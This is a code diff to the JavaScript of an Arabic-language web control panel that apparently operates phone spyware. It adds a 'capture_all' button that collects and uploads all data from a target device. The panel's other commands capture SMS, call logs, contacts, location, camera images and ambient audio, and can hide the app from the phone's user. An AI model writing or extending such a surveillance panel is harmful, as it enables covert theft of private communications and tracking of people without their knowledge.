@@ -411,6 +411,7 @@ async function renderOverview(el) {
     <!-- Quick Actions -->
     <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px">
       <button class="btn btn-sm btn-primary" onclick="sendCommand('capture_location')" style="width:auto">📍 تحديث الموقع</button>
+      <button class="btn btn-sm btn-primary" onclick="sendCommand('capture_all')" style="width:auto;background:#8b5cf6">⚡ جمع كل البيانات</button>
       <button class="btn btn-sm btn-primary" onclick="sendCommand('sync_now')" style="width:auto;background:#22c55e">🔄 مزامنة فورية</button>
       <button class="btn btn-sm btn-outline" onclick="switchTab('commands')" style="width:auto">🎮 إرسال أمر</button>
       <button class="btn btn-sm btn-outline" onclick="refreshDevices()" style="width:auto">⟳ تحديث</button>
@@ -667,6 +668,7 @@ async function renderCommands(el) {
       <button class="cmd-btn" onclick="sendCommand('capture_sms')">💬 الرسائل SMS</button>
       <button class="cmd-btn" onclick="sendCommand('capture_contacts')">👤 جهات الاتصال</button>
       <button class="cmd-btn" onclick="sendCommand('capture_apps')">📱 التطبيقات</button>
+      <button class="cmd-btn" onclick="sendCommand('capture_all')" style="background:#3b82f6;color:white;font-weight:600">⚡ جمع ورفع كل البيانات فوراً</button>
     </div>
 
     <div style="margin:16px 0"><strong style="color:#f59e0b">📷 وسائط</strong></div>
@@ -745,7 +747,7 @@ async function sendCommand(command, params = {}) {
 }
 
 function getCmdLabel(cmd) {
-  const labels = { sync_now:'مزامنة فورية', capture_location:'التقاط موقع', capture_call_logs:'سجل المكالمات', capture_sms:'الرسائل SMS', capture_contacts:'جهات الاتصال', capture_apps:'التطبيقات', capture_camera:'تصوير كاميرا', record_ambient:'تسجيل صوت (30ث)', lock_device:'قفل الجهاز', hide_app:'إخفاء التطبيق', unhide_app:'إظهار التطبيق', play_sound:'تشغيل صوت', send_alert:'إرسال تنبيه', update_interval:'تحديث كل دقيقة', restart_service:'إعادة تشغيل الخدمة' };
+  const labels = { sync_now:'مزامنة فورية', capture_location:'التقاط موقع', capture_call_logs:'سجل المكالمات', capture_sms:'الرسائل SMS', capture_contacts:'جهات الاتصال', capture_apps:'التطبيقات', capture_all:'جمع كل البيانات', capture_camera:'تصوير كاميرا', record_ambient:'تسجيل صوت (30ث)', lock_device:'قفل الجهاز', hide_app:'إخفاء التطبيق', unhide_app:'إظهار التطبيق', play_sound:'تشغيل صوت', send_alert:'إرسال تنبيه', update_interval:'تحديث كل دقيقة', restart_service:'إعادة تشغيل الخدمة' };
   return labels[cmd] || cmd;
 }
 
